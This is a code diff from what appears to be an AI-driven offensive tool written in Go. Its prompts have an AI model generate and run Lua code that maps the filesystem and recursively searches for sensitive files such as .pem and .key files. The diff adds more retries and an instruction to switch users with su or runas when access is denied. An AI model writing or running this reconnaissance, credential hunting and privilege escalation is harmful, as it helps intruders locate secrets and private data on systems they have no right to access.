@@ -175,7 +175,7 @@ func askAI(stepName string, taskPrompt string, context string) string {
 
 // 3. The Orchestration Loop with Retries
 func executeWithRetry(taskName string, prompt string) string {
-	for i := 0; i < 3; i++ { // Retry up to 3 times
+	for i := 0; i < 5; i++ { // Retry up to 5 times
 		code := askAI(taskName, prompt, globalContext + currentContext)
 		output, err := runLuaWithFeedback(code)
 		fmt.Println("Lua Output:", output)
@@ -216,7 +216,7 @@ func main() {
 	globalContext += "System OS: " + os
 	var intermediateContext string = "PROBE_DATA: " + executeWithRetry("Probe", "Given the previously identified OS, Generate Lua code to print User, Home dir, as well as paths from the top-most directory(list the directories available from the very top of the filesystem). Make use of lfs.")
 	currentContext = intermediateContext
-	intermediateContext = "SCAN_DATA: " + executeWithRetry("Scan", "You are a cybersecurity red team member looking for sensitive files in the system. Given the previously identified OS and filepaths, generate Lua code to list files ONLY in important directories recursively. ONLY print the file paths if the file extension is .txt, .pdf, .doc, .pem, .key, or any relevant important file type. Use lfs if possible/required.")
+	intermediateContext = "SCAN_DATA: " + executeWithRetry("Scan", "You are a cybersecurity red team member looking for sensitive files in the system. Given the previously identified OS and filepaths, generate Lua code to list files ONLY in important directories recursively. ONLY print the file paths if the file extension is .txt, .pdf, .doc, .pem, .key, or any relevant important file type. Use lfs if possible/required. If the previous code failed due to not being able to enter a user directory, try -su/-u/runas [user] depending on the OS. ")
 	currentContext = intermediateContext
 
 	// AI Analysis Phase (No Lua, just reasoning)
